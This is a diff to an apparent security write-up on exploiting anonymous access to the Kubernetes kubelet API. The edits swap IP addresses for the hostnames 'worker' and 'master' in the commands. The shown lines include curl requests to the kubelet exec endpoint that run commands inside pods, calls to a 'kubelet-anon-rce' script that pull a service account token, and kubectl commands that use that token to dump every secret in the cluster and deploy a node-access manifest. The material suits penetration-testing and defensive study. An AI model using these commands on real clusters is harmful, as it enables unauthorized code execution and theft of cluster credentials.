@@ -102,7 +102,7 @@ $ curl -ks https://10.1.2.3:10250/pods | jq '.'
 A template request to run a command in a container is shown below:
 
 ```
-$ curl -Gks https://10.1.2.3:10250/exec/{namespace}/{pod}/{container} \
+$ curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} \
   -d 'input=1' -d 'output=1' -d 'tty=1'                               \
   -d 'command=ls' -d 'command=/tmp'
 ```
@@ -112,7 +112,7 @@ It should be noted that the `command` is passed as an array (split by spaces) an
 Target `{namespace}`, `{pod}` and `{container}` values can be obtained from the `/pods` endpoint as shown in the previous section. For example, to run `ls /tmp` in the `tiller` container the request would be:
 
 ```
-$ curl -Gks https://10.1.2.3:10250/exec/kube-system/tiller-797d1b1234-gb6qt/tiller \
+$ curl -Gks https://worker:10250/exec/kube-system/tiller-797d1b1234-gb6qt/tiller \
   -d 'input=1' -d 'output=1' -d 'tty=1'                                            \
   -d 'command=ls' -d 'command=/tmp'
 
@@ -125,7 +125,7 @@ The author's [`kubelet-anon-rce`](https://github.com/serain/kubelet-anon-rce) sc
 
 ```
 $ python3 kubelet-anon-rce.py           \
-          --node 10.1.2.3               \
+          --node worker                 \
           --namespace kube-system       \
           --pod tiller-797d1b1234-gb6qt \
           --container tiller            \
@@ -159,7 +159,7 @@ The token for the `tiller` Service Account can thus be retrieved by using the `k
 
 ```
 $ python3 kubelet-anon-rce.py           \
-          --node 10.1.2.3               \
+          --node worker                 \
           --namespace kube-system       \
           --pod tiller-797d1b1234-gb6qt \
           --container tiller            \
@@ -176,14 +176,14 @@ Interaction with the API through `curl` is straightforward:
 
 ```
 $ curl -ks -H "Authorization: Bearer <TOKEN>" \
-  https://10.1.1.1:6443/api/v1/namespaces/{namespace}/secrets
+  https://master:6443/api/v1/namespaces/{namespace}/secrets
 ```
 
 A more elegant solution is to use `kubectl` directly:
 
 ```
 $ kubectl --insecure-skip-tls-verify=true  \
-          --server="https://10.1.1.1:6443" \
+          --server="https://master:6443"   \
           --token="<TOKEN>"                \
           get secrets --all-namespaces -o json
 ```
@@ -227,7 +227,7 @@ This can be deployed with the following command:
 
 ```
 $ kubectl --insecure-skip-tls-verify=true  \
-          --server="https://10.1.1.1:6443" \
+          --server="https://master:6443"   \
           --token="<TOKEN>"                \
           deploy -f node-access.yaml
 ```
@@ -247,7 +247,7 @@ If a high-privileged Service Account is not available, an attacker may consider 
 The `rbac.authorization.k8s.io` API can provide a lot of information about roles and service accounts available in given namespaces:
 
 ```
-$ curl -ks https://10.1.1.1:6443/apis/rbac.authorization.k8s.io/
+$ curl -ks https://master:6443/apis/rbac.authorization.k8s.io/
 ```
 
 ## Recommendations
